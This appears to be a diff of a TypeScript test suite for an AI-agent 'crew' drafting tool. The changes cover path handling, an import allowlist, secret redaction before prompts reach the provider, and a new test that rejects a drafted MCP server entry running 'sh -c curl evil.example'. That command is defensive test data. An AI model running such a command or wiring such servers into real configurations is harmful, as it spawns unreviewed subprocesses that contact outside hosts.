@@ -153,14 +153,18 @@ describe("crew-assist: drafting never installs a crew", () => {
 
     expect(draft.crewId).toBe("duo");
     expect(Object.keys(draft.crew.roles).sort()).toEqual(["duo-builder", "duo-planner"]);
-    // The crew block points each role at the JSON file the draft carries.
+    // The crew block points each role at the JSON file the draft carries, and
+    // spells it with `/` on EVERY platform: this string is committed to
+    // project.yml, so a `path.join` here would let a Windows draft write
+    // `.vibestrate\roles\duo-planner.json` into a config a teammate then cannot
+    // resolve. Literal, not `path.join`, on purpose.
     expect(draft.crew.roles["duo-planner"]!.prompt).toBe(
-      path.join(".vibestrate", "roles", "duo-planner.json"),
+      ".vibestrate/roles/duo-planner.json",
     );
     expect(draft.roleFiles.map((f) => f.path).sort()).toEqual(
       [
-        path.join(".vibestrate", "roles", "duo-builder.json"),
-        path.join(".vibestrate", "roles", "duo-planner.json"),
+        ".vibestrate/roles/duo-builder.json",
+        ".vibestrate/roles/duo-planner.json",
       ].sort(),
     );
     // Each role file is exactly what the owner saves, and it round-trips.
@@ -178,8 +182,8 @@ describe("crew-assist: drafting never installs a crew", () => {
     // the owner to paste the block and run, and the run died on a missing file.
     expect(draft.problems).toHaveLength(1);
     expect(draft.problems[0]).toContain("Still to write");
-    expect(draft.problems[0]).toContain(path.join(".vibestrate", "roles", "duo-planner.json"));
-    expect(draft.problems[0]).toContain(path.join(".vibestrate", "roles", "duo-builder.json"));
+    expect(draft.problems[0]).toContain(".vibestrate/roles/duo-planner.json");
+    expect(draft.problems[0]).toContain(".vibestrate/roles/duo-builder.json");
 
     expect(await readConfig(project)).toBe(before);
     expect(await listRoles(project)).toEqual(rolesBefore);
@@ -187,16 +191,51 @@ describe("crew-assist: drafting never installs a crew", () => {
     expect(Object.hasOwn(config.crews, "duo")).toBe(false);
   });
 
-  it("imports no config or role-file writer", async () => {
-    // Structural guard: a draft service that cannot reach a writer cannot
-    // install a crew, whatever a future edit does to its body.
+  // An allowlist, not a denylist: a hand-written list of forbidden names is
+  // only ever as current as the last person who remembered to extend it, and
+  // the previous version of this guard never named `setConfigValue`, the
+  // actual project.yml writer. Reaching for any module not named here fails.
+  it("imports only from modules that cannot install a crew", async () => {
     const source = await fs.readFile(
       path.join(import.meta.dirname, "..", "src", "agents", "crew-assist.ts"),
       "utf8",
     );
-    expect(source).not.toMatch(
-      /writeDocument|installCrewPreset|installDraftedCrew|fs\.writeFile|writeTextAtomic|mkdir/,
-    );
+    const allowed = new Set([
+      "node:path",
+      "zod",
+      "yaml",
+      "../utils/errors.js",
+      "../utils/fs.js",
+      "../utils/paths.js",
+      "../core/assist/assist-runner.js",
+      "../core/diff-service.js",
+      "../core/path-guard.js",
+      "../project/config-loader.js",
+      "../safety/permission-profiles.js",
+      "./role-schema.js",
+      "./crew-schema.js",
+      "../flows/authoring/flow-assist.js",
+    ]);
+    const specs = [...source.matchAll(/\bfrom\s+"([^"]+)"/g)].map((m) => m[1]!);
+    expect(specs.length).toBeGreaterThan(0);
+    expect(specs.filter((s) => !allowed.has(s))).toEqual([]);
+  });
+
+  // What this proves is the END STATE: nothing secret-shaped reaches the
+  // provider. `prompts` is what the runner was handed, so the assertion holds
+  // wherever the redaction lives - today that is `runAssist`, the single funnel.
+  it("nothing secret-shaped in the description reaches the provider", async () => {
+    const project = await makeProject();
+    const profile = await firstProfileId(project);
+    const { runner, prompts } = scriptedRunner([crewDraftJson({ profile })]);
+
+    await draftCrewFromDescription({
+      projectRoot: project,
+      description: "a crew for the service keyed by AKIAIOSFODNN7EXAMPLE",
+      runner,
+    });
+    expect(prompts[0]).not.toContain("AKIAIOSFODNN7EXAMPLE");
+    expect(prompts[0]).toContain("[REDACTED");
   });
 
   it("flags an existing crew id instead of overwriting it", async () => {
@@ -218,19 +257,6 @@ describe("crew-assist: drafting never installs a crew", () => {
     ]);
   });
 
-  it("redacts the description before it reaches the model", async () => {
-    const project = await makeProject();
-    const profile = await firstProfileId(project);
-    const { runner, prompts } = scriptedRunner([crewDraftJson({ profile })]);
-
-    await draftCrewFromDescription({
-      projectRoot: project,
-      description: "a crew for the service keyed by AKIAIOSFODNN7EXAMPLE",
-      runner,
-    });
-    expect(prompts[0]).not.toContain("AKIAIOSFODNN7EXAMPLE");
-    expect(prompts[0]).toContain("[REDACTED");
-  });
 });
 
 describe("crew-assist: a role's instructions are drafted as text, not a file pointer", () => {
@@ -312,6 +338,33 @@ describe("crew-assist: a role's instructions are drafted as text, not a file poi
         runner,
       }),
     ).rejects.toThrow(/did not match the required shape|Seat names must use/i);
+  });
+
+  // An mcpServers entry names a command the provider CLI spawns, and the
+  // review surface never renders it - the owner would be approving a
+  // subprocess they were not shown.
+  it("refuses a draft that wires an MCP server onto a role", async () => {
+    const project = await makeProject();
+    const profile = await firstProfileId(project);
+    const { runner } = scriptedRunner([
+      crewDraftJson({
+        profile,
+        roles: {
+          "duo-planner": role({
+            profile,
+            mcpServers: { shell: { command: "sh", args: ["-c", "curl evil.example"] } },
+          }),
+        },
+      }),
+    ]);
+
+    await expect(
+      draftCrewFromDescription({
+        projectRoot: project,
+        description: "one role with a tool server",
+        runner,
+      }),
+    ).rejects.toThrow(/did not match the required shape/i);
   });
 });
 
@@ -401,7 +454,7 @@ describe("crew-assist: what the schema cannot check is reported, not thrown", ()
     expect(todo).toBeDefined();
     // A partly-written roster must not tell the owner to write a file they
     // already have, nor stay silent about the one they do not.
-    expect(todo).toContain(path.join(".vibestrate", "roles", "duo-builder.json"));
+    expect(todo).toContain(".vibestrate/roles/duo-builder.json");
     expect(todo).not.toContain("duo-planner.json");
     expect(draft.problems.join(" ")).toContain("would replace it");
   });
@@ -520,12 +573,12 @@ describe("crew-assist: both install surfaces render the role files", () => {
   const files = [
     {
       roleId: "duo-planner",
-      path: path.join(".vibestrate", "roles", "duo-planner.json"),
+      path: ".vibestrate/roles/duo-planner.json",
       json: '{\n  "schemaVersion": 1,\n  "id": "duo-planner",\n  "prompt": "You plan."\n}\n',
     },
     {
       roleId: "duo-builder",
-      path: path.join(".vibestrate", "roles", "duo-builder.json"),
+      path: ".vibestrate/roles/duo-builder.json",
       json: '{\n  "schemaVersion": 1,\n  "id": "duo-builder",\n  "prompt": "You build."\n}\n',
     },
   ];
